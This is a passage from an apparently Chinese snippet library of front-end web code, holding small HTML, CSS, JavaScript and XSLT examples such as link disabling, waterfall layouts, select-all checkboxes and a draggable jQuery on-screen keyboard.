      //+++++++++++++++++++++++++++++++++
      var cc = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(cc)
    })();
  }
    </script>
  </head>
  <body>
    <pre>
    //有名函数（函数定义）
    function hasname (){
      var aa = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(aa)
    }

    hasname();
    //匿名函数（函数表达式）
    var noname = function(){
      //+++++++++++++++++++++++++++++++++
      var bb = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(bb)
    };
    noname();
   //闭包
    (function(){
      //+++++++++++++++++++++++++++++++++
      var cc = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(cc)
    })();
    </pre>

  </body>
</html>

#T=禁用、启用超链接
// 禁用、启用超链接
// @objId : 超链接ID
// @disable: true,禁用； false：启用
function disableAnchor(objId, disable) {
	var obj = gId(objId);
	if (disable) { // disable
		var href = obj.getAttribute("href");
		if (href && href != "" && href != null) {
			obj.setAttribute('href_bak', href);
		}
		obj.removeAttribute('href');
		// 处理onclick事件
		var onclick = obj.getAttribute("onclick"); 
		if(onclick != null){ 
			obj.setAttribute('onclick_bak', onclick); 
			obj.setAttribute('onclick', "void(0);"); 
		} 
		obj.onclick = null;
		obj.style.color = "gray";
		obj.setAttribute('disabled', 'disabled');
	}
	else { // enable
		if (obj.attributes['href_bak'])
			obj.setAttribute('href', obj.attributes['href_bak'].nodeValue);
		if(obj.attributes['onclick_bak']!=null) 
			obj.setAttribute('onclick', obj.attributes['onclick_bak'].nodeValue); 
		obj.removeAttribute('style');
		obj.removeAttribute('disabled');
	}
}
#T=两端对齐div+css
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<style>
	.w1
		{
			width:500px;
		}
	.a1
		{
			background:#00FF00;
			text-align:justify;
			text-justify:inter-ideograph;
		}
	.a2
		{
			background:#FFFF00;
		}
</style>

<p>原效果：</p>
<div class="w1 a2">
css两端对齐，div+css文章两端对齐的解决方法css如何让一行内的文字两端对齐？ text-align:justify;. text-justify语法：text-justify : auto |inter-word | newspaper | distribute | distribute-all-lines | inter-ideograph 
参数： 
auto :允许浏览器用户代理确定使用的两端对齐法则 
inter-word :通过增加字之间的空格对齐文本。该行为是对齐所有文本行最快的方法。它的两端对齐行为对段落的最后一行无效 
newspaper : 通过增加或减少字或字母之间的空格对齐文本。是用于拉丁文字母表两端对齐的最精确格式 
distribute :处理空格很像newspaper，适用于东亚文档。尤其是泰国 
distribute-all-lines :两端对齐行的方式与distribute相同，也同样不包含两段对齐段落的最后一行。适用于表意字文档 
inter-ideograph : 为表意字文本提供完全两端对齐。他增加或减少表意字和词间的空格 
说明： 
设置或检索对象内文本的对齐方式。 
对应的脚本特性为textJustify。
</div>

<p>两端对齐后产效果：</p>
<div class="w1 a1">
css两端对齐，div+css文章两端对齐的解决方法css如何让一行内的文字两端对齐？ text-align:justify;. text-justify语法：text-justify : auto |inter-word | newspaper | distribute | distribute-all-lines | inter-ideograph 
参数： 
auto :允许浏览器用户代理确定使用的两端对齐法则 
inter-word :通过增加字之间的空格对齐文本。该行为是对齐所有文本行最快的方法。它的两端对齐行为对段落的最后一行无效 
newspaper : 通过增加或减少字或字母之间的空格对齐文本。是用于拉丁文字母表两端对齐的最精确格式 
distribute :处理空格很像newspaper，适用于东亚文档。尤其是泰国 
distribute-all-lines :两端对齐行的方式与distribute相同，也同样不包含两段对齐段落的最后一行。适用于表意字文档 
inter-ideograph : 为表意字文本提供完全两端对齐。他增加或减少表意字和词间的空格 
说明： 
设置或检索对象内文本的对齐方式。 
对应的脚本特性为textJustify。
</div> 
</body>
</html>

#T=浏览器杀手
<input type="button" value="浏览器杀手" onclick="window.opener=null;window.open('','_self');window.close();" />
#T=排除 重复元素 by 司徒正美
 
<!doctype html>
<html dir="ltr" lang="zh-CN">
  <head>
    <meta charset="utf-8"/>
    <title>排除 重复元素 by 司徒正美</title>

    <script type="text/javascript" charset="utf-8">
      window.onload = function(){
        var $ = function(id){
          return document.getElementById(id);
        }

        var a = $("id1");
        var b = $("id2")
        var c = $("id3")
        var d = $("id4")
        var e = $("id5")
        var f = $("id6")
        var g = $("id7")
        var h = $("id8")
        var arr = [a,b,c,d,e,f,g,h];

        var contains = function(a,b){
          if(!+"\v1"){
            return a === b ? false : a.contains(b);
          }else{
            return !!(a.compareDocumentPosition(b) & 16)
          }
        }
        
        var sortOrder = function(){
          if(!+"\v1"){
            return function( a, b ) {
              return a.sourceIndex - b.sourceIndex;
            }
          }else{
            return function(a,b){
              a.compareDocumentPosition(b) & 4 ? -1 : a === b ? 0 : 1;
            }
          }
        }();

        arr.sort(sortOrder);
        var uuid = 0
        var getAncestor = function(array){
          var remove = {},uid ;
          for (var i = 0,n=array.length; i < n; i++) {
            for (var j = n - 1; j > i; j--) { //比如一共有五个元素，那么每趟为
              var a = array[i],b=array[j];  
              if (contains(a,b)) {         
                uid = b.uuid || (b.uuid = "dom-"+uuid++) ;
                remove[uid] = 1;
              }else if(contains(b,a)) {     
                uid = a.uuid || (a.uuid = "dom-"+uuid++);
                remove[uid] = 1;
              }         
            }
          }
          var result = [],ri= 0
          for(var k=0;k<n;k++){
            if(!remove[array[k].uuid]){
              result[ri++] = array[k]
            }
          }
          return result;
        }

        var ancestor = getAncestor(arr)
        for(var i=0,n=ancestor.length;i<n;i++){
          alert(ancestor[i].id)
        }

      }

    </script>

  </head>
  <body id="id10">
    <p id="id1">一<span id="id2">二</span><span id="id3">二</span><span class="bbb">二</span></p>
    <p id="id4">一<span id="id5">二</span></p>
    <p title="aaa">一<span title="aaa">二</span></p>
    <div id="id6">
      <p id="id7"><strong id="id8">Strong<span id="id9">二</span></strong></p>
    </div>
  </body>
</html>

#T=瀑布布局 table + css
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head> 
	<title>tmpl</title> 
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<style type="text/css">
		.warp
			{
			}
		.warp
			td
				{
					width:260px;
				}
		.box
			{
				width:240px;
				border:1px solid #ccc;
				background:#eee;border-radius:3px;
				list-style:none;
				margin:15px 8px;
				text-align:center;
			}
	</style>
</head> 
<body>
	<div style="width:1000px;text-align:center;border:0px solid red;">
		<table cellpadding="0" cellspacing="0" border="1" class="warp" align="center">
			<tr valign="top">
				<td>
					<div class="box" style="height:270px"></div>
					<div class="box" style="height:120px"></div>
					<div class="box" style="height:360px"></div>
					<div class="box" style="height:261px"></div>
					<div class="box" style="height:304px"></div>
					<div class="box" style="height:361px"></div>
					<div class="box" style="height:189px"></div>
					<div class="box" style="height:220px"></div>
				</td>
				<td>
					<div class="box" style="height:180px"></div>
					<div class="box" style="height:360px"></div>
					<div class="box" style="height:140px"></div>
					<div class="box" style="height:368px"></div>
					<div class="box" style="height:264px"></div>
					<div class="box" style="height:239px"></div>
					<div class="box" style="height:401px"></div>
					<div class="box" style="height:123px"></div>
				</td>
				<td>
					<div class="box" style="height:301px"></div>
					<div class="box" style="height:150px"></div>
					<div class="box" style="height:263px"></div>
					<div class="box" style="height:218px"></div>
					<div class="box" style="height:345px"></div>
					<div class="box" style="height:291px"></div>
					<div class="box" style="height:150px"></div>
					<div class="box" style="height:169px"></div>
				</td>
			</tr>
		</table>
	</div>
</body>
</html>
#T=瀑布流布局 css column
<!Doctype html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>html5,css3,column效果</title>
		<style>
			* {
				padding:0;
				margin:0;
			}
			#wrap {
				position:relative;
				margin:0px auto;
				-webkit-column-width:250px;
				-moz-cloumn-width:250px;
			}
			#wrap li {
				width:250px;
				display:inline-block;
				list-style:none;
			}
			.boxCont {
				position:relative;
				margin:15px;
				border:1px solid #ccc;
				background:#eee;
				background: -ms-gradient(linear, 0% 20%, 0% 92%, from(#fff), to(#f3f3f3), color-stop(.1, #fff));
				background: -ms-linear-gradient(0 0 270deg, #f3f3f3, #f3f3f3 10%, #fff);
				background: -moz-linear-gradient(0 0 270deg, #f3f3f3, #f3f3f3 10%, #fff);
				background: -o-linear-gradient(0 0 270deg, #f3f3f3, #f3f3f3 10%, #fff);
				-ms-border-radius: 60px / 5px;
				-moz-border-radius: 60px / 5px;
				border-radius:60px / 5px;
				-ms-box-shadow: 0px 0px 35px rgba(0, 0, 0, 0.1) inset;
				-moz-box-shadow: 0px 0px 35px rgba(0, 0, 0, 0.1) inset;
				box-shadow: 0px 0px 35px rgba(0, 0, 0, 0.1) inset;
			}
			.boxCont:before {
				content:'';
				width: 50px;
				height: 50px;
				top:0;
				right:0;
				position:absolute;
				display: inline-block;
				z-index:-1;
				-ms-box-shadow: 10px -10px 8px rgba(0, 0, 0, 0.2);
				-moz-box-shadow: 10px -10px 8px rgba(0, 0, 0, 0.2);
				box-shadow: 10px -10px 8px rgba(0, 0, 0, 0.2);
				-ms-transform: rotate(2deg) translate(-14px, 20px) skew(-20deg);
				-moz-transform: rotate(2deg) translate(-14px, 20px) skew(-20deg);
				-o-transform: rotate(2deg) translate(-14px, 20px) skew(-20deg);
				transform: rotate(2deg) translate(-14px, 20px) skew(-20deg);
			}
			.boxCont:after {
				content:'';
				width: 100px;
				height: 100px;
				top:0;
				left:0;
				position:absolute;
				z-index:-1;
				display: inline-block;
				-ms-box-shadow: -10px -10px 10px rgba(0, 0, 0, 0.2);
				-moz-box-shadow: -10px -10px 10px rgba(0, 0, 0, 0.2);
				box-shadow: -10px -10px 10px rgba(0, 0, 0, 0.2);
				-ms-transform: rotate(2deg) translate(20px, 25px) skew(20deg);
				-moz-transform: rotate(2deg) translate(20px, 25px) skew(20deg);
				-o-transform: rotate(2deg) translate(20px, 25px) skew(20deg);
				transform: rotate(2deg) translate(20px, 25px) skew(20deg);
			}
			
		</style>
	</head>
	<body>
		<ul id="wrap">
			<li>
				<div class="boxCont" style="height:255px;">1</div>
			</li>
			<li>
				<div class="boxCont" style="height:306px;">2</div>
			</li>
			<li>
				<div class="boxCont" style="height:317px;">3</div>
			</li>
			<li>
				<div class="boxCont" style="height:388px;">4</div>
			</li>
			<li>
				<div class="boxCont" style="height:346px;">5</div>
			</li>
			<li>
				<div class="boxCont" style="height:272px;">6</div>
			</li>
			<li>
				<div class="boxCont" style="height:337px;">7</div>
			</li>
			<li>
				<div class="boxCont" style="height:257px;">8</div>
			</li>
			<li>
				<div class="boxCont" style="height:339px;">9</div>
			</li>
			<li>
				<div class="boxCont" style="height:306px;">10</div>
			</li>
			<li>
				<div class="boxCont" style="height:350px;">11</div>
			</li>
			<li>
				<div class="boxCont" style="height:239px;">12</div>
			</li>
			<li>
				<div class="boxCont" style="height:246px;">13</div>
			</li>
			<li>
				<div class="boxCont" style="height:270px;">14</div>
			</li>
			<li>
				<div class="boxCont" style="height:331px;">15</div>
			</li>
			<li>
				<div class="boxCont" style="height:270px;">16</div>
			</li>
			<li>
				<div class="boxCont" style="height:232px;">17</div>
			</li>
			<li>
				<div class="boxCont" style="height:284px;">18</div>
			</li>
			<li>
				<div class="boxCont" style="height:335px;">19</div>
			</li>
			<li>
				<div class="boxCont" style="height:245px;">20</div>
			</li>
			<li>
				<div class="boxCont" style="height:265px;">21</div>
			</li>
			<li>
				<div class="boxCont" style="height:354px;">22</div>
			</li>
			<li>
				<div class="boxCont" style="height:255px;">23</div>
			</li>
			<li>
				<div class="boxCont" style="height:362px;">24</div>
			</li>
			<li>
				<div class="boxCont" style="height:310px;">25</div>
			</li>
			<li>
				<div class="boxCont" style="height:272px;">26</div>
			</li>
			<li>
				<div class="boxCont" style="height:378px;">27</div>
			</li>
			<li>
				<div class="boxCont" style="height:221px;">28</div>
			</li>
			<li>
				<div class="boxCont" style="height:236px;">29</div>
			</li>
			<li>
				<div class="boxCont" style="height:373px;">30</div>
			</li>
		</ul>
		<input type="button" id="more_btn" value="加载更多..." />
		<script type="text/javascript">
var $id = function (o)
	{
		return document.getElementById(o) || o
	};
$id("more_btn").onclick = function ()
{
	for (i = 31; i < 60; i++)
	{
		height = Math.floor(Math.random() * 200 + 200);
		$id("wrap").innerHTML += '<li><div class="boxCont" style="height:' + height + 'px;">' + i + '</div></li>';
	};
}
		</script>
	</body>

</html>
#T=瀑布流双(奇偶)列布局 xslt Table html xml xsl
<!-- data.html -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
	<body>
		<textarea id="ta" rows="10" cols="10"></textarea>
		<script language="javascript"> 
			// Load XML 
			var xml = new ActiveXObject("Microsoft.XMLDOM") 
			xml.async = false 
			xml.load("data.xml") 
			// Load the XSL 
			var xsl = new ActiveXObject("Microsoft.XMLDOM") 
			xsl.async = false 
			xsl.load("data.xsl") 
			// Transform 
			var s = xml.transformNode(xsl)
			document.write(s);
			document.getElementById("ta").value = s;
		</script> 
	</body>
</html>
<!-- ============================================================================= -->
<!-- data.xsl -->
<?xml version='1.0' encoding='gb2312'?>
<xsl:stylesheet version="1.0" xmlns="http://www.w3.org/TR/REC-html40" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html" encoding="UTF-8" indent="yes" omit-xml-declaration="no" />
	<xsl:template match="/">
		<table border ="1">
			<tr>
				<td valign="top" width="200px">
					<xsl:apply-templates select="//class[position() mod 2 = 1]" />
				</td>
				<td valign="top" width="200px">
					<xsl:apply-templates select="//class[position() mod 2 = 0]" />
				</td>
			</tr>
		</table>
	</xsl:template>
	<xsl:template match="//class[position() mod 2 = 1]">
		<xsl:variable name="n" select="position()"/>
		<table border="1">
			<tr>
				<td>
					<xsl:value-of select="."/>
				</td>
			</tr>
		</table>
	</xsl:template>
	<xsl:template match="//class[position() mod 2 = 0]">
		<xsl:variable name="n" select="position()" />
		<table border="1">
			<tr>
				<td>
					<xsl:value-of select="."/>
				</td>
			</tr>
		</table>
	</xsl:template>
</xsl:stylesheet>
<!-- ============================================================================= -->
<!-- data.xml -->
<?xml version="1.0" encoding="gb2312"?>
<?xml-stylesheet type='text/xsl' href='data.xsl'?>
<subject>
	<class>
		<classid>
			1
		</classid>
		<text>
			数据一 
			数据一
			数据一
			数据一
			数据一
			数据一
			数据一
			数据一
		</text>
	</class>
	<class>
		<classid>
			2
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			3
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			4
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			5
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			6
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			7
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			8
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			9
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			10
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			11
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			12
		</classid>
		<text>
			数据一
		</text>
	</class>
	<class>
		<classid>
			13
		</classid>
		<text>
			数据一
		</text>
	</class>
</subject>
#T=全选、全不选、反选
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>【JavaScripst效果】全选、全不选、反选</title>
	<style>
		h2, ul, p { margin: 0; padding: 0; }
		ul { list-style: none; }
		h2 { font-size: 100%; text-indent: 5px; }
		input { vertical-align: -2px; *vertical-align: -1px; }
		.m-box { width: 400px; border: 1px #666 solid; margin: 0 auto; font: 12px/30px 'microsoft yahei'; }
		.m-box .hd,.m-box .ft { background-color: #ccc; }
		.m-box .bd { overflow-x: hidden; overflow-y: auto; position: relative;  height: 120px; }
		.m-box .bd li label { display: block; height: 30px; vertical-align: top; }
	</style>
</head>
<body>
<div class="m-box">
	<h2 class="hd">选择列表</h2>
	<ul class="bd" id="j-itemBox">
		<li><label><input type="checkbox" name="item" value="1"/>选项1</label></li>
		<li><label><input type="checkbox" name="item" value="2"/>选项2</label></li>
		<li><label><input type="checkbox" name="item" value="3"/>选项3</label></li>
		<li><label><input type="checkbox" name="item" value="4"/>选项4</label></li>
		<li><label><input type="checkbox" name="item" value="5"/>选项5</label></li>
		<li><label><input type="checkbox" name="item" value="6"/>选项6</label></li>
		<li><label><input type="checkbox" name="item" value="7"/>选项7</label></li>
		<li><label><input type="checkbox" name="item" value="8"/>选项8</label></li>
		<li><label><input type="checkbox" name="item" value="9"/>选项9</label></li>
		<li><label><input type="checkbox" name="item" value="10"/>选项10</label></li>
	</ul>
	<p class="ft"><label><input type="checkbox" id="j-checkAll"/>全选</label>&nbsp;<a href="javascript:void(0);" id="j-checkReverse">反选</a>&nbsp;<a href="javascript:void(0);" id="j-checkOk">确定</a></p>
</div>
<script>
	/* by jununx@gmail.com */
	function Check(options){
		this.oItemsBox = options.oItemsBox;
		this.aItems = options.aItems;
		this.oCheckAll = options.oCheckAll;
		this.oCheckReverse = options.oCheckReverse;
		this.oCheckOk = options.oCheckOk;
	}
	Check.prototype = {
		init : function(){
			var that = this;
			//根据选项更新全选
			this.oItemsBox.onclick = function(e){
				var ev = e || window.event, target = ev.target || ev.srcElement;
				if(target.tagName.toLowerCase() === "input"){
					that.checkReverse(that);
				}
			};
			//全选操作
			this.oCheckAll.onclick = function(){
				that.checkAll();
			};
			//反选操作
			this.oCheckReverse.onclick = function(){
				that.checkReverse(that, true);
			};
			//确定
			this.oCheckOk.onclick = function(){
				var test = that.checkReverse(that);
				alert("您选择了value是：【"+test+"】的选项！");
			};
		},
		//全选/全不选
		checkAll : function(){
			for(var i = 0, len = this.aItems.length; i < len; i++){
				this.aItems[i].checked = this.oCheckAll.checked;
			}
		},
		//根据选项更新全选
		checkReverse : function(that, isReverse){
			for(var i = 0, n = 0, arr = [], len = that.aItems.length; i < len; i++){
				if(isReverse){
					that.aItems[i].checked = !that.aItems[i].checked;
				}
				if(that.aItems[i].checked){n++;arr.push(that.aItems[i].value)}
			}
			that.oCheckAll.checked = len == n;
			return arr;
		}
	};

	//实例化
	var myCheck = new Check({
		oItemsBox : document.getElementById('j-itemBox'),
		aItems : document.getElementsByName('item'),
		oCheckAll : document.getElementById('j-checkAll'),
		oCheckReverse : document.getElementById('j-checkReverse'),
		oCheckOk : document.getElementById('j-checkOk')
	});
	myCheck.init();
</script>
</body>
</html>

#T=软键盘 jquery css
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>new document</title>
		<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
		<META NAME="Author" CONTENT="EditPlus,Microshaoft">
		<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
		<META NAME="Description" CONTENT="EditPlus,Microshaoft">
		<style type="text/css">
			.keyboard
			{
				width:800px;
				height:300px;
				text-align:center;
				position:absolute;
			}
			.keyboard div
			{
				height:50px;
				line-height:50px;
				float:left;
			}
			#keyboardHead
			{
				width:800px;
				position:relative;
			}
			#keyboardLetterQ
			{
				width:800px;
				position:relative;
				left:75px;
			}
			#keyboardSpaceBar
			{
				width:800px;
				position:relative;
				left:200px;
				top:52px;
			}
			.simpleKey
			{
				width:50px;
				border:1px solid black;
			}
			.enterKey
			{
				width:100px;
				height:100px;
				border:1px solid black;
			}
			.shiftKey {
				width:115px;
				border:1px solid black;
			}
			.backspaceKey
			{
				width:120px;
				border:1px solid black;
			}
			.capslockKey
			{
				width:90px;
				border:1px solid black;
			}
			.spaceKey
			{
				width:300px;
				border:1px solid black;
			}
			.keyboard div[name="key"]:hover
			{
				background: Gray;
			}
			.keyboard div[name="key"]
			{
				cursor:pointer;
			}
			
		</style>
		<script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.4.1.min.js" type="text/javascript"></script>
		<script type="text/javascript">
		//移动键盘
		function dragMing(idORclass1, idORclass2)
		{
			var obj = this; //这里的this是指dragMing对象么
			this.idORclass1 = idORclass1; //给dragMing的idORclass1赋值
			this.idORclass2 = idORclass2; //给dragMing的idORclass2赋值
			this.deltaX = 0;
			this.deltaY = 0;

			function dragStart(dragEvent)
			{
				obj.deltaX = dragEvent.clientX - $(obj.idORclass2).offset().left;
				obj.deltaY = dragEvent.clientY - $(obj.idORclass2).offset().top;
				$(document).bind("mousemove", dragMove);
				$(document).bind("mouseup", dragStop);
				dragEvent.preventDefault();
			}

			function dragMove(dragEvent)
			{
				$(obj.idORclass2).css(
				{
					"left": (dragEvent.clientX - obj.deltaX) + "px",
					"top": (dragEvent.clientY - obj.deltaY) + "px"
				})
				dragEvent.preventDefault();
			}

			function dragStop()
			{
				$(document).unbind("mousemove", dragMove);
				$(document).unbind("mouseup", dragStop);
			}
			$(document).ready(function ()
			{
				$(obj.idORclass1).bind("mousedown", dragStart);
			})
		}
		//绘制键盘
		function drawKeyboard(type)
		{
			$("#keyboardNum").empty();
			$("#keyboardLetterQ").empty();
			$("#keyboardLetterA").empty();
			$("#keyboardLetterZ").empty();
			$("#keyboardSpaceBar").empty();
			if (type == "lower")
			{
				var keyboardNum =
				{
					"192": "`",
					"49": "1",
					"50": "2",
					"51": "3",
					"52": "4",
					"53": "5",
					"54": "6",
					"55": "7",
					"56": "8",
					"57": "9",
					"48": "0",
					"189": "-",
					"187": "=",
					"8": "Backspace"
				};
				var keyboardLetterQ =
				{
					"81": "q",
					"87": "w",
					"69": "e",
					"82": "r",
					"84": "t",
					"89": "y",
					"85": "u",
					"73": "i",
					"79": "o",
					"80": "p",
					"219": "[",
					"221": "]"
				};
				var keyboardLetterA =
				{
					"20": "Caps Lock",
					"65": "a",
					"83": "s",
					"68": "d",
					"70": "f",
					"71": "g",
					"72": "h",
					"74": "j",
					"75": "k",
					"76": "l",
					"186": ";",
					"222": "'",
					"220": "\\"
				};
				var keyboardLetterZ =
				{
					"16": "Shift",
					"90": "z",
					"88": "x",
					"67": "c",
					"86": "v",
					"66": "b",
					"78": "n",
					"77": "m",
					"188": ",",
					"190": ".",
					"191": "/"
				};
				var keyboardSpaceBar =
				{
					"32": "Space",
					"": "Tim"
				};
				var key = "";
			}
			else
			{
				var keyboardNum =
				{
					"192": "~",
					"49": "!",
					"50": "@",
					"51": "#",
					"52": "$",
					"53": "%",
					"54": "^",
					"55": "&",
					"56": "*",
					"57": "(",
					"48": ")",
					"189": "_",
					"187": "+",
					"8": "Backspace"
				};
				var keyboardLetterQ =
				{
					"81": "Q",
					"87": "W",
					"69": "E",
					"82": "R",
					"84": "T",
					"89": "Y",
					"85": "U",
					"73": "I",
					"79": "O",
					"80": "p",
					"219": "{",
					"221": "}"
				};
				var keyboardLetterA =
				{
					"20": "Caps Lock",
					"65": "A",
					"83": "S",
					"68": "D",
					"70": "F",
					"71": "G",
					"72": "H",
					"74": "J",
					"75": "K",
					"76": "L",
					"186": ":",
					"222": "\"",
					"220": "|"
				};
				var keyboardLetterZ =
				{
					"16": "Shift",
					"90": "Z",
					"88": "X",
					"67": "C",
					"86": "V",
					"66": "B",
					"78": "N",
					"77": "M",
					"188": "<",
					"190": ">",
					"191": "?"
				};
				var keyboardSpaceBar =
				{
					"32": "Space",
					"": "Tim"
				};
				var key = "";
			}
			$.each(keyboardNum, function (key, value)
			{
				if (value != "Backspace")
				{
					key = $('<div class="simpleKey" name="key" key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardNum").append(key);
				}
				else
				{
					key = $('<div class="backspaceKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardNum").append(key);
				}
			});
			$.each(keyboardLetterQ, function (key, value)
			{
				key = $('<div class="simpleKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
				$("#keyboardLetterQ").append(key);
			});
			$.each(keyboardLetterA, function (key, value)
			{
				if (value != "Caps Lock")
				{
					key = $('<div class="simpleKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardLetterA").append(key);
				}
				else
				{
					key = $('<div class="capslockKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardLetterA").append(key);
				}
			});
			$.each(keyboardLetterZ, function (key, value)
			{
				if (value != "Shift")
				{
					key = $('<div class="simpleKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardLetterA").append(key);
				}
				else
				{
					key = $('<div class="shiftKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardLetterA").append(key);
				}
			});
			$.each(keyboardSpaceBar, function (key, value)
			{
				if (value != "Space")
				{
					key = $('<div class="simpleKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardSpaceBar").append(key);
				}
				else
				{
					key = $('<div class="spaceKey" name="key"  key="' + key + '" value="' + value + '">' + value + '</div>');
					$("#keyboardSpaceBar").append(key);
				}
			});
			addMouseClickEvent();
		}
		//监听鼠标点击事件
		function addMouseClickEvent()
		{
			$("#close").click(function ()
			{
				closeKeyboard()
			});
			$("div[name='key']").hover(function ()
			{
				$(this).css("background-color", "Gray");
			}, function ()
			{
				$(this).css("background-color", "White");
			}).click(function ()
			{
				var thisValue = $(this).attr("value");
				var ID = $("#state").val();
				switch (thisValue)
				{
				case "":
					//"
					$("#" + ID).val($("#" + ID).val() + "\"");
					if ($("#shift").attr("checked") == true)
					{
						if ($("#capsLock").attr("checked") != true)
						{
							drawKeyboard("lower");
						}
						$("#shift").attr("checked", false);
					}
					break;
				case "Shift":
					$("#shift").attr("checked", $("#shift").attr("checked") == true ? false : true);
					if ($("#shift").attr("checked") == true)
					{
						drawKeyboard("upper")
					}
					else
					{
						if ($("#capsLock").attr("checked") != true)
						{
							drawKeyboard("lower");
						}
					}
					break;
				case "Caps Lock":
					$("#capsLock").attr("checked", $("#capsLock").attr("checked") == true ? false : true);
					$("#capsLock").attr("checked") == true ? drawKeyboard("upper") : drawKeyboard("lower");
					$("#shift").attr("checked", false)
					break;
				case "Space":
					$("#" + ID).val($("#" + ID).val() + " ");
					break;
				case "Backspace":
					$("#" + ID).val($("#" + ID).val().substring(0, $("#" + ID).val().length - 1));
					break;
				default:
					$("#" + ID).val($("#" + ID).val() + thisValue);
					if ($("#shift").attr("checked") == true)
					{
						if ($("#capsLock").attr("checked") != true)
						{
							drawKeyboard("lower");
						}
						$("#shift").attr("checked", false);
					}
					break;
				}
				$("#" + ID).focus();
			});
		}
		//监听键盘事件
		function addKeydownEvent()
		{
			$("html").keydown(function (event)
			{
				var realkey = String.fromCharCode(event.keyCode);
				//特殊键
				if (event.keyCode == 32)
				{
					realkey = "Space"
				}
				if (event.keyCode == 13)
				{
					realkey = "Enter"
				}
				if (event.keyCode == 27)
				{
					realkey = " Esc"
				}
				if (event.keyCode == 16)
				{
					realkey = "Shift";
					$("#shift").attr("checked", $("#shift").attr("checked") == true ? false : true);
					if ($("#shift").attr("checked") == true)
					{
						drawKeyboard("upper")
					}
					else
					{
						if ($("#capsLock").attr("checked") != true)
						{
							drawKeyboard("lower");
						}
					}
				}
				if (event.keyCode == 17)
				{
					realkey = " Ctrl"
				}
				if (event.keyCode == 18)
				{
					realkey = "Alt"
				}
				if (event.keyCode == 8)
				{
					realkey = "Backspace"
				}
				if (event.keyCode == 20)
				{
					realkey = "Caps Lock";
					$("#capsLock").attr("checked", $("#capsLock").attr("checked") == true ? false : true);
					$("#capsLock").attr("checked") == true ? drawKeyboard("upper") : drawKeyboard("lower");
				}
				$("div[name='key']").css("background-color", "White")
				$("div[key=" + event.keyCode + "]").css("background-color", "Gray");
				//如果按了shif再按其他键并且这个键不是shif键盘变回小写
				//如果capsLock选中了键盘就不用变回小写
				if ($("#shift").attr("checked") == true && event.keyCode != 16)
				{
					if ($("#capsLock").attr("checked") != true)
					{
						drawKeyboard("lower");
					}
					$("#shift").attr("checked", false);
				}
			});
		}
		//打开键盘
		function openKeyboard(ID)
		{
			$("#keyboard").css("visibility", "visible");
			$("#state").val(ID);
		}
		//关闭键盘
		function closeKeyboard()
		{
			$("#keyboard").css("visibility", "hidden")
		}
		$(function ()
		{
			var divKeyBoard = '<div id="keyboard" class="keyboard"><div id="keyboardHead"><div><input id="shift" type="checkbox"/>Shift</div><div><input id="capsLock" type="checkbox"/>Caps Lock</div><div id="close" style="border:1px solid black; float:right; width:20px; height:20px; cursor:pointer;"><img src="/Image/close.gif" style=" width:20px; height:20px"/></div></div><div id="keyboardNum"></div><div id="keyboardLetterQ"></div><div id="keyboardLetterA"></div><div id="keyboardLetterZ"></div><div id="keyboardSpaceBar"></div></div>';
			$("body").append(divKeyBoard);
			drawKeyboard("lower");
			addKeydownEvent();
			$("#keyboard").css("visibility", "hidden");
			var drag = new dragMing("#keyboard", "#keyboard");
		})
		</script>
	</head>
	<body>
